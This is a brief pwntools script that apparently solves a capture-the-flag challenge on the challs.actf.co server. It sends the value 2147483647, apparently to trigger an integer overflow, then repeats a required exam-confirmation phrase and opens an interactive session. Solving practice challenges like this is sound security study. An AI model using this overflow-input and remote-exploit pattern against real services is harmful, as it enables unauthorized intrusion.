from pwn import *

io = remote("challs.actf.co", 31322)

phrase = b"I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam."
io.sendlineafter(b": ", b"2147483647")
io.sendlineafter(b": ", phrase)
io.sendlineafter(b": ", phrase)
io.interactive()
